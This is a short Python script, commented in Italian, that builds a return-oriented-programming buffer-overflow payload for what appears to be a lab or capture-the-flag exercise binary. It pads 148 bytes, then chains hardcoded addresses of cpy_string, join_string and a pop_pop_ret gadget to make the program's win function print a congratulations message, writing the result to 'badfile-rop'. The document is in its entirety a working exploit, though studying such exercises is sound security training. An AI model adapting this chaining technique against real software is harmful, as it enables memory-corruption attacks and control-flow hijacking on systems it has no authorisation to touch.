
#bisogna exploitare la vulnerabilita` in modo che venga stampata la stringa "Congratulations user you win" dove user e` il nostro nome

import os 
import struct

#win stampa s3, QUINDI bisogna mettere str1 e str2 dentro str3 insieme al nome
#argc<3 quindi va chiamato con badfile sofia ciao

#per mettere dentro str3 bisogna mettere una cosa alla volta con la join_string
#quindi copio str1 in str3 poi aggiungo str2->str3 poi nome->str3

#quindi cpy_string, due join e poi win
#servono i gadget --> pop_pop_ret

#si sfrutta il buffer dentro vuln

str1 = 0x804a060
str2 = 0x804a084
str3 = 0x804a0a0

argv = 0xbffff591

join_string = 0x804854c
cpy_string = 0x804851a
win = 0x804857e

#da cambiare se si compila di nuovo
pop_pop_ret = 0x0804869a

#buff 0x90+4 = 16*9+4 = 144+4 = 148
#bisogna prima gestire il buffer dentro vuln !
payload = "A"*148

payload += struct.pack("I", cpy_string)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", str3)
payload += struct.pack("I", str1)

payload += struct.pack("I", join_string)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", str3)
payload += struct.pack("I", argv)

payload += struct.pack("I", join_string)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", str3)
payload += struct.pack("I", str2)

payload += struct.pack("I", win)

f = open("badfile-rop", "a")
f.write("%s" % payload)
f.close()



